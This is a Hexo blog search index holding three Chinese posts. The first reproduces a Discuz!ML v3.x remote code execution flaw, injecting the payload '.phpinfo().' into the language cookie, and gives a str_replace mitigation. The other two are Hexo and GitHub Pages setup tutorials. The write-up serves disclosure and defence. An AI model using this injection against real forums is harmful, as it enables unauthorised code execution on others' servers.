      <link href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，<br>攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，<br>进行远程代码执行利用，该漏洞利用方式简单，危害性较大。<br>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><p><strong>漏洞影响版本：</strong><br>Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3 product of codersclub.org</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建Discuz！ML 环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724113043.png" alt></p><p>在主页进行抓包，修改Language的值，添加  <code>&#39;.phpinfo().&#39;</code><br>成功复现该漏洞<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724114153.png" alt></p><hr><h1 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h1><p>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，<br>全局搜索一下的话，应该有不少地方有进行包含可以直接利用，危害很大。<br>VulkeyChen师傅的建议：单看语言这个点，在/source/class/discuz/discuz_application.php<br>第338行之后341行之前加入该代码暂缓此安全问题：</p><pre><code>$lng = str_replace(&quot;(&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;)&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;&#39;&quot;,&quot;&quot;,$lng);$lng = str_replace(&#39;&quot;&#39;,&quot;&quot;,$lng);$lng = str_replace(&#39;`&#39;,&quot;&quot;,$lng);</code></pre><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://blog.topsec.com.cn/discuz-ml-v3-x-代码注入漏洞深度分析/" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a><br><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github分支备份hexo</title>
      <link href="/2019/07/05/github-fen-zhi-bei-fen-hexo/"/>
      <url>/2019/07/05/github-fen-zhi-bei-fen-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>使用hexo搭建个人博客框架，配置起来有些消耗时间，管理起来也不是特别方便。特别是有时需要在其他电脑上写博客时，就让人头疼。所以我们就利用Github的分支，来备份hexo，方便快速搭上手写博客。</p><hr><h1 id="二、创建本地分支目录"><a href="#二、创建本地分支目录" class="headerlink" title="二、创建本地分支目录"></a>二、创建本地分支目录</h1><h2 id="1-新建文件夹存放分支工作目录。"><a href="#1-新建文件夹存放分支工作目录。" class="headerlink" title="1. 新建文件夹存放分支工作目录。"></a>1. 新建文件夹存放分支工作目录。</h2><p><code>mkdir hexo</code></p><h2 id="2-把你的GitHub的远程仓库克隆到hexo文件夹"><a href="#2-把你的GitHub的远程仓库克隆到hexo文件夹" class="headerlink" title="2. 把你的GitHub的远程仓库克隆到hexo文件夹"></a>2. 把你的GitHub的远程仓库克隆到hexo文件夹</h2><p><code>git clone https://github.com/yourusername/yourusername.github.io hexo</code></p><h2 id="3-删除除了版本管理的-git之外的所有文件和文件夹"><a href="#3-删除除了版本管理的-git之外的所有文件和文件夹" class="headerlink" title="3. 删除除了版本管理的.git之外的所有文件和文件夹"></a>3. 删除除了版本管理的.git之外的所有文件和文件夹</h2><pre><code>cd hexorm -r *</code></pre><h2 id="4-把要备份的文件复制到hexo目录"><a href="#4-把要备份的文件复制到hexo目录" class="headerlink" title="4. 把要备份的文件复制到hexo目录"></a>4. 把要备份的文件复制到hexo目录</h2><pre><code>scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json</code></pre><blockquote><p>注意：<br>如果使用的主题是从Github克隆的，那么使用命令删除它的Git文件（以next主题为例）<br><code>rm -R themes/next/.git*</code></p></blockquote><hr><h1 id="三、创建分支"><a href="#三、创建分支" class="headerlink" title="三、创建分支"></a>三、创建分支</h1><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p>在blog项目仓库下，输入备份分支hexo，点击create创建（因为我已经创建过了，所以显示的不一样）<br>或者在本地使用命令 <code>git checkout -b hexo</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705133032.png" alt></p><h2 id="2-点击设置，把默认分支设置为新建的备份分支"><a href="#2-点击设置，把默认分支设置为新建的备份分支" class="headerlink" title="2. 点击设置，把默认分支设置为新建的备份分支"></a>2. 点击设置，把默认分支设置为新建的备份分支</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132053.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132123.png" alt></p><hr><h1 id="四、提交备份"><a href="#四、提交备份" class="headerlink" title="四、提交备份"></a>四、提交备份</h1><p>在本地的hexo文件夹打开git bash，依次执行以下命令：</p><pre><code>git add -all   #保存所有文件到暂存区git commit -m &quot;创建hexo分支&quot; #提交变更git push --set-upstream origin hexo#推送到Github，并用`--set-upstream`与origin创建关联#将hexo设置为默认分区</code></pre><hr><h1 id="五、合并管理"><a href="#五、合并管理" class="headerlink" title="五、合并管理"></a>五、合并管理</h1><p>将本地hexo分支中的.git文件夹复制到博客根目录中，<br>我们只需要手动管理hexo分支中的文件（备份），<br>.gitignore之外的文件由hexo管理（hexo d）<br>移除主题目录下的Git管理文件</p><p><code>rm -R themes/next/.git* #以next主题为例</code></p><p>master分支的文件则由hexo管理，编辑hexo配置文件<em>_config.yml</em></p><pre><code>deploy:        type: git        repo: https://github.com/yourusername/yourusername.github.io        branch: master</code></pre><hr><h1 id="六、发表文章及修改配置"><a href="#六、发表文章及修改配置" class="headerlink" title="六、发表文章及修改配置"></a>六、发表文章及修改配置</h1><h2 id="1-将相关更改（配置修改或发表文章）推送到hexo分支"><a href="#1-将相关更改（配置修改或发表文章）推送到hexo分支" class="headerlink" title="1. 将相关更改（配置修改或发表文章）推送到hexo分支"></a>1. 将相关更改（配置修改或发表文章）推送到hexo分支</h2><pre><code>git add .git commit -m &quot;修改配置/发表文章&quot;git push origin hexo</code></pre><h2 id="2-将静态文件推送到master分支"><a href="#2-将静态文件推送到master分支" class="headerlink" title="2. 将静态文件推送到master分支"></a>2. 将静态文件推送到master分支</h2><pre><code>hexo clean hexo ghexo d</code></pre><hr><h1 id="七、迁移"><a href="#七、迁移" class="headerlink" title="七、迁移"></a>七、迁移</h1><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><pre><code>npm install -g hexo-clihexo initnpm install</code></pre><h2 id="2-克隆hexo分支"><a href="#2-克隆hexo分支" class="headerlink" title="2. 克隆hexo分支"></a>2. 克隆hexo分支</h2><p><code>git clone -b hexo https://github.com/username/username.github.io</code></p><hr><p>这样就可以进行写作了，写完记得同步备份博客。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 分支 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages+Hexo搭建个人博客（踩坑之路）</title>
      <link href="/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/"/>
      <url>/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实很早之前就想搭建一个个人博客，出于各种原因，一直没有行动。最近终于着手开始搭建，希望自己可以一直坚持下去。在搭建的过程中，踩了不少坑，特此记录，也希望对后来人有一点点参考价值。</p><hr><h1 id="一、Github"><a href="#一、Github" class="headerlink" title="一、Github"></a>一、Github</h1><h2 id="1-注册Github账号"><a href="#1-注册Github账号" class="headerlink" title="1. 注册Github账号"></a>1. 注册Github账号</h2><p>进入<a href="https://github.com" target="_blank" rel="noopener">Github</a>官网，注册账号。</p><h2 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2. 创建仓库"></a>2. 创建仓库</h2><p>点击首页右上角头像左侧的头像<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705010509.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011051.png" alt></p><h2 id="3-Github-Pages"><a href="#3-Github-Pages" class="headerlink" title="3. Github Pages"></a>3. Github Pages</h2><p>点击Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011609.png" alt><br>找到GitHub Pages，以用户名命名的仓库自动开启github pages，确认开启后就可以通过给出的网址访问了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011514.png" alt></p><hr><h1 id="二、Hexo"><a href="#二、Hexo" class="headerlink" title="二、Hexo"></a>二、Hexo</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>是一个快速、简洁且高效的博客框架，可以参考官方文档。</p><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><p>要使用hexo，必须安装<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a>和<a href="https://git-scm.com/download/" target="_blank" rel="noopener">Git</a>。网上教程很多，这里不再赘述。</p><h2 id="2-hexo安装"><a href="#2-hexo安装" class="headerlink" title="2. hexo安装"></a>2. hexo安装</h2><p>先创建存放blog文件的文件夹，切换到此文件夹右击git bash打开<br>输入命令安装hexo：<br><code>npm install -g hexo-cli</code></p><p>依次执行：</p><pre><code>hexo init npm installhexo g #生成静态网页hexo s #启动本地服务</code></pre><p>完成后，在浏览器输入localhost:4000就可以看到你的博客了</p><hr><h1 id="三、部署到Github"><a href="#三、部署到Github" class="headerlink" title="三、部署到Github"></a>三、部署到Github</h1><h2 id="1-设置SSH"><a href="#1-设置SSH" class="headerlink" title="1. 设置SSH"></a>1. 设置SSH</h2><p>返回GIt Bash中，依次输入：</p><pre><code>git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;</code></pre><p>这里的yourname输入你的Github的用户名，<br>youremail输入你的Github邮箱</p><pre><code>cd ~/.sshlsmkdir key_backupcp id_rsa* key_backuprm id_rsa*#检查有没有生成过SSH并备份移除ssh-keygen -t rsa -C &quot;youremail&quot; #生成新的SSH，接下来输入密码 一路回车</code></pre><h2 id="2-添加SSH-Key到Github"><a href="#2-添加SSH-Key到Github" class="headerlink" title="2.添加SSH Key到Github"></a>2.添加SSH Key到Github</h2><p>点击头像，选择Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022259.png" alt><br>添加新的SSH Key<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022426.png" alt><br>找到c:\users\当前用户名.ssh    文本形式打开id_ras.pub (打开系统查看隐藏文件选项)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022656.png" alt><br>测试是否连接成功<br><code>ssh -T git@github.com</code><br>输入yes就ok</p><h2 id="3-部署到Github"><a href="#3-部署到Github" class="headerlink" title="3. 部署到Github"></a>3. 部署到Github</h2><p>打开hexo配置文件（根目录）<strong>_config.yml</strong><br>翻到最后将xxx修改为你的Github账户（冒号后面有一个空格）</p><pre><code>deploy:    type: git    repo: https://github.com/xxx/xxx.github.io.git    branch: master</code></pre><p>然后安装deploy-git(不然报错”ERROR Deployer not found: git“)<br><code>npm install hexo-deployer-git --save</code></p><p>然后</p><pre><code>hexo cleanhexo ghexo d</code></pre><p>deploy时可能要你输入密码，再刷新username.github.io就可以看到你的blog。</p><hr><p><strong>注意：</strong></p><blockquote><p>如果输入命令的过程中出现了”LF will be replaced by CRLF”报错，<br>    1. windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行add . 时出现提示<br>    2. CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，<br>        所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续git add<br>        或者git commit的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符 </p></blockquote><p><strong>解决办法：</strong></p><blockquote><ol><li>这个只是一个警告，我们直接忽略就好。</li><li>git config –global core.autocrlf false  //禁用自动转换 </li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
